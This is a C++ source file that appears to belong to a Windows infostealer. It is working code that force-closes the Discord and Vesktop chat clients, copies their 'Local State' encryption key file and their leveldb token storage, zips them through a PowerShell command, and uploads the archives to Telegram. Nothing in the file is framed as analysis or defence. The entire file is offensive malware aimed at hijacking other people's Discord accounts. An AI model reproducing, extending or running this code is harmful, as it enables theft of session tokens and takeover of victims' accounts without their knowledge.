#include "pch.h"
#include "../wrappers/telegram.h"
#include "../utils.h"
#include "../debug.h"

#include <string>
#include <filesystem>
#include <cstdlib>
#include <Windows.h>
#include <TlHelp32.h>
#include <thread>

namespace fs = std::filesystem;

namespace grab {
    int zipDirectory(const std::string& dirPath, const std::string& outputZip) {
        std::string cmd = "powershell -Command \"Compress-Archive -Path '" + dirPath + "\\*' -DestinationPath '" + outputZip + "' -Force\"";
        return std::system(cmd.c_str());
    }

    void GetDiscordFolder() {
        try {
            const char* appDataEnv = std::getenv("APPDATA");
            const char* tempEnv = std::getenv("TEMP");
            Debug::Log("Got environment variables");

            std::string usrname = utils::WideToStr(utils::WindowsComputerName().c_str());
            Debug::Log(("Computer name: " + usrname).c_str());

            if (!appDataEnv || !tempEnv) {
                Debug::LogError("Environment variables null");
                return;
            }

            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(PROCESSENTRY32);
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap == INVALID_HANDLE_VALUE) {
                Debug::LogError("CreateToolhelp32Snapshot failed");
                return;
            }

            int terminatedCount = 0;
            Process32First(snap, &pe);
            do {
                if (wcscmp(pe.szExeFile, L"Discord.exe") == 0) {
                    HANDLE discord = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (discord == NULL) {
                        Debug::Log("OpenProcess failed for Discord.exe");
                        continue;
                    }

                    if (TerminateProcess(discord, 1)) {
                        terminatedCount++;
                        Debug::Log(("Terminated Discord PID: " + std::to_string(pe.th32ProcessID)).c_str());
                    }
                    else {
                        Debug::LogError("TerminateProcess failed");
                    }
                    CloseHandle(discord);
                }
            } while (Process32Next(snap, &pe));

            CloseHandle(snap);
            Debug::Log(("Terminated " + std::to_string(terminatedCount) + " Discord processes").c_str());

            Debug::Log("Starting file operations");
            fs::path discordState = fs::path(appDataEnv) / "discord" / "Local State";
            fs::path discordStorage = fs::path(appDataEnv) / "discord" / "Local Storage" / "leveldb";
            Debug::Log(("discordState: " + discordState.string()).c_str());
            Debug::Log(("discordStorage: " + discordStorage.string()).c_str());

            bool stateExists = fs::exists(discordState);
            bool storageExists = fs::exists(discordStorage);

            Debug::Log(("State exists: " + std::string(stateExists ? "yes" : "no")).c_str());
            Debug::Log(("Storage exists: " + std::string(storageExists ? "yes" : "no")).c_str());

            if (!stateExists) {
                Debug::LogError("Local State file missing - aborting");
                return;
            }

            fs::path tempdiscord = fs::path(tempEnv) / "juni_discord";
            fs::path out = fs::path(tempEnv) / "juni_discord.zip";
            fs::path templocalstate = fs::path(tempEnv) / "localstate-discord";

            Debug::Log(("tempdiscord: " + tempdiscord.string()).c_str());
            Debug::Log(("out: " + out.string()).c_str());
            Debug::Log(("templocalstate: " + templocalstate.string()).c_str());

            Debug::Log("Copying Local State...");

            if (fs::exists(out)) fs::remove(out);
            if (fs::exists(templocalstate)) fs::remove(templocalstate);

            fs::copy_file(discordState, templocalstate, fs::copy_options::overwrite_existing);

            Debug::Log("Sending Local State to telegram...");
            telegram::SendDocument(templocalstate.string());
            Debug::Log("Local State sent");

            Debug::Log("Creating temp directory...");
            fs::create_directories(tempdiscord);
            Debug::Log("Temp directory created");

            Debug::Log("Iterating leveldb files...");

            for (const auto& entry : fs::directory_iterator(discordStorage)) {
                if (entry.is_regular_file() && entry.path().extension() == ".ldb") {
                    fs::path destination = tempdiscord / entry.path().filename();
                    auto msg = "Copying: " + entry.path().string() + " -> " + destination.string();
                    Debug::Log(msg.c_str());

                    fs::copy_file(entry.path(), destination, fs::copy_options::overwrite_existing);
                }
            }
            Debug::Log("Copied .ldb files");

            Debug::Log("Zipping directory...");
            int zipResult = zipDirectory(tempdiscord.string(), out.string());

            if (fs::exists(out)) {
                Debug::Log(("Zip created: " + out.string() + " (" + std::to_string(fs::file_size(out)) + " bytes)").c_str());
            }
            else {
                Debug::LogError("Zip file was not created");
                return;
            }

            Debug::Log("Sending zip...");
            telegram::SendDocument(out.string());
        }
        catch (const fs::filesystem_error& e) {
            Debug::LogError(std::string("Filesystem exception: ") + e.what());
        }
        catch (const std::exception& e) {
            Debug::LogError(std::string("Standard exception: ") + e.what());
        }
        catch (...) {
            Debug::LogError("Unknown exception caught");
        }
    }

    void GetVesktop() {
        try {
            const char* appDataEnv = std::getenv("APPDATA");
            const char* tempEnv = std::getenv("TEMP");

            std::string usrname = utils::WideToStr(utils::WindowsComputerName().c_str());

            if (!appDataEnv || !tempEnv) return;

            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(PROCESSENTRY32);
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // i keep forgetting to close handles
            if (snap == INVALID_HANDLE_VALUE) {
                Debug::LogError("CreateToolhelp32Snapshot failed");
                return;
            }

            Process32First(snap, &pe);

            do {
                if (wcscmp(pe.szExeFile, L"vesktop.exe") == 0) {
                    /*
                    if (strcmp(usrname.c_str(), "Asriel")) {
                        return; // stop terminating my discord
                    }
                    */

                    HANDLE discord = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (discord == NULL) continue;

                    if (TerminateProcess(discord, 1)) {
                        Debug::Log("vesktop terminated");
                    }
                    else {
                        Debug::LogError("Failed to terminate process");
                    }

                    CloseHandle(discord);
                }
            } while (Process32Next(snap, &pe));

            CloseHandle(snap);

            fs::path discordState = fs::path(appDataEnv) / "vesktop" / "sessionData" / "Local State";
            fs::path discordStorage = fs::path(appDataEnv) / "vesktop" / "sessionData" / "Local Storage" / "leveldb";
            Debug::Log(("discordState: " + discordState.string()).c_str());
            Debug::Log(("discordStorage: " + discordStorage.string()).c_str());

            if (!fs::exists(discordState) && !fs::exists(discordStorage)) return;

            fs::path tempdiscord = fs::path(tempEnv) / "juni_vesktop";
            fs::path out = fs::path(tempEnv) / "juni_vesktop.zip";
            fs::path templocalstate = fs::path(tempEnv) / "localstate-vesktop";

            if (fs::exists(out)) fs::remove(out);
            if (fs::exists(templocalstate)) fs::remove(templocalstate);

            fs::copy_file(discordState, templocalstate);

            Debug::Log(("tempvesktop: " + tempdiscord.string()).c_str());
            Debug::Log(("out: " + out.string()).c_str());
            Debug::Log(("templocalstate: " + templocalstate.string()).c_str());

            Debug::Log("Sending localstate");
            telegram::SendDocument(templocalstate.string());

            fs::create_directories(tempdiscord);
            Debug::Log("Created Directory for vesktop");

            for (const auto& entry : fs::directory_iterator(discordStorage)) {
                if (entry.is_regular_file() && entry.path().extension() == ".ldb") {
                    fs::path destination = tempdiscord / entry.path().filename();

                    Debug::Log(("Copying to: " + destination.string()).c_str());

                    fs::copy_file(entry.path(), destination, fs::copy_options::overwrite_existing);
                }
            }

            zipDirectory(tempdiscord.string(), out.string());
            telegram::SendDocument(out.string());
        }
        catch (const fs::filesystem_error& e) {
            Debug::LogError(std::string("Filesystem exception: ") + e.what());
        }
        catch (const std::exception& e) {
            Debug::LogError(std::string("Standard exception: ") + e.what());
        }
        catch (...) {
            Debug::LogError("Unknown exception caught");
        }
    }
}